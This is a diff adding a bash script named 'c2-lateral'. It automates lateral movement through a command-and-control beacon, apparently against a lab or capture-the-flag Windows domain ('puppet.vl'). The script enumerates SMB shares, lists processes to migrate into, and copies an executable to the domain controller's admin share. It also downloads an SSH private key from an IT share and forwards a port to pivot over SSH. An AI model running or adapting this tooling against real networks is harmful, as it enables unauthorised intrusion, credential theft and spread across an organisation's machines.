@@ -1,0 +1,63 @@
+#!/bin/bash
+# c2-lateral - Lateral movement automation
+# Usage: c2-lateral <beacon_id>
+# Enables SMB shares, PSExec, port forwarding, and SSH pivoting
+C2="$(dirname "$0")/c2"
+BEACON="$1"
+
+if [ -z "$BEACON" ]; then
+    echo "Usage: c2-lateral <beacon_id>"
+    echo ""
+    echo "Sub-commands (run via c2 task after connecting):"
+    echo "  SMB Enum:       ls \\\\\\\\dc01.puppet.vl\\\\it\\\\"
+    echo "  SMB Enum:       sa-netshares dc01"
+    echo "  SMB Enum:       sa-netshares file01"
+    echo "  Port Forward:   portfwd add --bind 2222 -r 10.13.38.33:22"
+    echo "  Process List:   ps"
+    echo "  Migrate:        migrate -p <pid>"
+    echo "  PSExec:         execute -o -s -- C:\\Windows\\System32\\cmd.exe /c copy C:\\programdata\\puppet\\puppet-update.exe \\\\\\\\dc01.puppet.vl\\\\C$\\\\programdata\\\\"
+    exit 1
+fi
+
+$C2 use "$BEACON" >/dev/null 2>&1
+
+echo "============================================"
+echo "  LATERAL MOVEMENT"
+echo "============================================"
+
+echo "[*] 1. Enumerating domain shares..."
+$C2 task "sa-netshares dc01"
+$C2 task "sa-netshares file01"
+$C2 task "net view /domain"
+$C2 task "net view \\\\dc01"
+$C2 task "net view \\\\file01"
+
+echo ""
+echo "[*] 2. Checking DC IT share access..."
+$C2 task "ls \\\\\\\\dc01.puppet.vl\\\\it\\\\"
+
+echo ""
+echo "[*] 3. Listing processes for migration targets..."
+$C2 task "ps"
+
+echo ""
+echo "[*] 4. Checking service control access..."
+$C2 task "sc query puppet"
+
+echo ""
+echo "[*] All tasked. Wait 120s then check output."
+echo ""
+echo "=== LATERAL MOVEMENT COMMANDS (run manually) ==="
+echo ""
+echo "  # Migrate to puppet service process:"
+echo "  c2 task 'migrate -p <PID of ruby.exe>'"
+echo ""
+echo "  # Access DC share (needs svc_puppet_win_t1):"
+echo "  c2 task 'ls \\\\\\\\dc01.puppet.vl\\\\it\\\\.ssh'"
+echo "  c2 task 'download \\\\\\\\dc01.puppet.vl\\\\it\\\\.ssh\\\\ed25519'"
+echo ""
+echo "  # Setup port forward for SSH:"
+echo "  c2 task 'portfwd add --bind 2222 -r 10.13.38.33:22'"
+echo ""
+echo "  # SSH from local:"
+echo "  echo 'ssh -i <key> -p 2222 svc_puppet_lin_t1@puppet.vl@127.0.0.1'"
